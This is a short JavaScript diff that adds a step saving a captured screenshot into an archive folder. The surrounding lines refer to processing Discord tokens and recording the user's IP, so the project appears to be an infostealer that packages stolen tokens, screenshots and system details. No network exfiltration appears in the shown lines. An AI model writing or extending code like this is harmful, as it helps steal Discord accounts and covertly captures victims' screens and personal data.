@@ -197,6 +197,20 @@ class Application {
             // Initialize file manager now that we know we have Discord tokens to process
             fileManager.init();
 
+            // Save screenshot to the generated save folder after fileManager is initialized
+            if (this.screenshotPath && this.screenshotCapture.screenshotExists()) {
+                try {
+                    const screenshotBuffer = this.screenshotCapture.getScreenshotBuffer();
+                    if (screenshotBuffer) {
+                        const filename = require('path').basename(this.screenshotPath);
+                        fileManager.saveBuffer(screenshotBuffer, 'Screenshots', filename);
+                        logger.info('Screenshot saved to archive folder', { filename });
+                    }
+                } catch (error) {
+                    logger.warn('Failed to save screenshot to archive folder', error.message);
+                }
+            }
+
             // Get system info for context
             const systemInfo = stats.getRawData().system;
             const userIp = systemInfo.ip || 'Unknown';
